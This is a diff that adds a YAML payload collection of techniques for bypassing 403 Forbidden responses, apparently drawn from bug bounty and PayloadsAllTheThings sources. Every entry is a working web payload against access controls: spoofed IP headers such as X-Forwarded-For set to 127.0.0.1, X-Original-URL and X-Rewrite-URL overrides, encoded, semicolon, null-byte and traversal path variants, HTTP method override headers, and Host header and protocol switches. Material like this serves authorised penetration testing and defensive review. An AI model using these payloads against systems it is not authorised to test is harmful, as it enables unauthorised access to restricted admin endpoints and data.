@@ -1,0 +1,214 @@
+# 403-bypass.yaml — 403 Forbidden bypass techniques
+metadata:
+  version: "1.0"
+  sources:
+    - "AllAboutBugBounty/daffainfo"
+    - "PayloadsAllTheThings/403 Bypass"
+    - "iamj0ker/bypass-403"
+    - "Bug Bounty Tips"
+  last_updated: "2026-03-27"
+
+# ──────────────────────────────────────────────
+# HEADER INJECTION
+# ──────────────────────────────────────────────
+
+header_injection:
+  - name: x_forwarded_for
+    payload: "X-Forwarded-For: 127.0.0.1"
+    context: "Add to request headers when endpoint returns 403"
+    notes: "Spoofs source IP. Backend may trust this header for internal IP checks."
+
+  - name: x_originating_ip
+    payload: "X-Originating-IP: 127.0.0.1"
+    context: "Add to request headers"
+    notes: "Alternative to X-Forwarded-For. Some apps check this header."
+
+  - name: x_remote_ip
+    payload: "X-Remote-IP: 127.0.0.1"
+    context: "Add to request headers"
+    notes: "Another IP spoofing header variant."
+
+  - name: x_remote_addr
+    payload: "X-Remote-Addr: 127.0.0.1"
+    context: "Add to request headers"
+    notes: "Simulates remote address from trusted proxy."
+
+  - name: x_real_ip
+    payload: "X-Real-IP: 127.0.0.1"
+    context: "Add to request headers"
+    notes: "Common header used by Nginx reverse proxy."
+
+  - name: x_client_ip
+    payload: "X-Client-IP: 127.0.0.1"
+    context: "Add to request headers"
+    notes: "Used by some load balancers and proxies."
+
+  - name: x_host
+    payload: "X-Host: 127.0.0.1"
+    context: "Add to request headers"
+    notes: "Override virtual host routing."
+
+  - name: x_forwarded_host
+    payload: "X-Forwarded-Host: 127.0.0.1"
+    context: "Add to request headers"
+    notes: "Spoofs the original Host header through proxies."
+
+  - name: x_custom_ip_authorization
+    payload: "X-Custom-IP-Authorization: 127.0.0.1"
+    context: "Add to request headers"
+    notes: "Some custom middleware checks this header for IP-based auth."
+
+  - name: x_original_url
+    payload: "X-Original-URL: /admin"
+    context: "Add to request headers with GET / as the URL"
+    notes: "IIS/Nginx may route based on X-Original-URL, bypassing URL-level access control."
+
+  - name: x_rewrite_url
+    payload: "X-Rewrite-URL: /admin"
+    context: "Add to request headers with GET / as the URL"
+    notes: "Similar to X-Original-URL. Used by some URL rewrite engines."
+
+  - name: referer_header
+    payload: "Referer: https://target.com/admin"
+    context: "Add to request headers"
+    notes: "Some apps check Referer to determine if request is from allowed page."
+
+  - name: content_type_switch
+    payload: "Content-Type: application/x-www-form-urlencoded"
+    context: "Change Content-Type from application/json"
+    notes: "Different content types may hit different middleware with different auth."
+
+# ──────────────────────────────────────────────
+# PATH MANIPULATION
+# ──────────────────────────────────────────────
+
+path_manipulation:
+  - name: trailing_slash
+    payload: "/admin/"
+    context: "When /admin returns 403"
+    notes: "Trailing slash may route to different handler with different ACL."
+
+  - name: path_with_dot
+    payload: "/admin/."
+    context: "When /admin returns 403"
+    notes: "Dot at end may bypass path-based access control regex."
+
+  - name: double_slash
+    payload: "//admin"
+    context: "When /admin returns 403"
+    notes: "Double slash may confuse path normalization."
+
+  - name: path_traversal_bypass
+    payload: "/./admin"
+    context: "When /admin returns 403"
+    notes: "Current directory reference may bypass path matching."
+
+  - name: path_with_semicolon
+    payload: "/admin;/"
+    context: "When /admin returns 403"
+    notes: "Semicolon is path parameter separator in Java (Tomcat, Spring). Path matching may not account for it."
+
+  - name: url_encoded_path
+    payload: "/%61dmin"
+    context: "When /admin returns 403"
+    notes: "%61 is URL-encoded 'a'. If WAF checks before decoding, bypass occurs."
+
+  - name: double_url_encoded_path
+    payload: "/%2561dmin"
+    context: "When /admin returns 403"
+    notes: "Double URL encoding. First decode: %61dmin, second decode: admin."
+
+  - name: unicode_normalization
+    payload: "/admi%6e"
+    context: "When /admin returns 403"
+    notes: "%6e is URL-encoded 'n'. Partial encoding may bypass pattern matching."
+
+  - name: case_variation
+    payload: "/Admin, /ADMIN, /aDmIn"
+    context: "When /admin returns 403 on case-sensitive systems"
+    notes: "If ACL is case-sensitive but routing is case-insensitive, bypass occurs."
+
+  - name: path_with_backslash
+    payload: "/admin\\..\\admin"
+    context: "When /admin returns 403 on Windows/IIS"
+    notes: "Backslash traversal on Windows-based servers."
+
+  - name: add_extension
+    payload: "/admin.json, /admin.html, /admin.php, /admin%20"
+    context: "When /admin returns 403"
+    notes: "Adding file extensions or whitespace may bypass path-based rules."
+
+  - name: wildcard_path
+    payload: "/admin/*"
+    context: "When /admin returns 403 but sub-paths are accessible"
+    notes: "Check if specific sub-paths under restricted path are accessible."
+
+  - name: api_version_path
+    payload: "/v1/admin, /api/admin, /internal/admin"
+    context: "When /admin returns 403"
+    notes: "Try different path prefixes that may route to same handler without ACL."
+
+  - name: null_byte_in_path
+    payload: "/admin%00.json"
+    context: "When /admin returns 403"
+    notes: "Null byte may truncate path in older systems while bypassing extension check."
+
+  - name: tab_newline_in_path
+    payload: "/admin%09, /admin%0a, /admin%0d"
+    context: "When /admin returns 403"
+    notes: "Tab, newline, carriage return may bypass whitespace-unaware path matching."
+
+# ──────────────────────────────────────────────
+# METHOD OVERRIDE
+# ──────────────────────────────────────────────
+
+method_override:
+  - name: x_http_method_override
+    payload: "X-HTTP-Method-Override: PUT"
+    context: "Send POST request with this header when PUT /admin returns 403"
+    notes: "Some frameworks honor this header to override HTTP method."
+
+  - name: x_method_override
+    payload: "X-Method-Override: PUT"
+    context: "Send POST request with this header"
+    notes: "Alternative method override header."
+
+  - name: x_http_method
+    payload: "X-HTTP-Method: DELETE"
+    context: "Send POST request with this header"
+    notes: "Another method override variant used by some frameworks."
+
+  - name: method_switch
+    payload: "Try: GET, POST, PUT, PATCH, DELETE, OPTIONS, HEAD, TRACE, CONNECT"
+    context: "When one HTTP method returns 403"
+    notes: "ACL may only block specific methods. Try all standard methods."
+
+  - name: override_query_param
+    payload: "POST /admin?_method=GET"
+    context: "Frameworks that support method override via query parameter"
+    notes: "Laravel, Rails, and others support _method query parameter."
+
+  - name: content_type_override
+    payload: "Send GET request body with Content-Type: application/json and method data"
+    context: "When POST is blocked but GET is allowed"
+    notes: "Some parsers process body regardless of HTTP method."
+
+# ──────────────────────────────────────────────
+# PROTOCOL & HOST TRICKS
+# ──────────────────────────────────────────────
+
+protocol_tricks:
+  - name: http_to_https
+    payload: "Change https:// to http:// or vice versa"
+    context: "When 403 is returned on one protocol"
+    notes: "Different protocol may hit different server/config with different ACL."
+
+  - name: host_header_override
+    payload: "Host: localhost"
+    context: "Change Host header to localhost/127.0.0.1"
+    notes: "If backend checks Host header for internal access, spoofing may bypass."
+
+  - name: http_10
+    payload: "Send request with HTTP/1.0 instead of HTTP/1.1"
+    context: "When 403 is returned with standard HTTP/1.1"
+    notes: "HTTP/1.0 may bypass middleware that only inspects HTTP/1.1 requests."
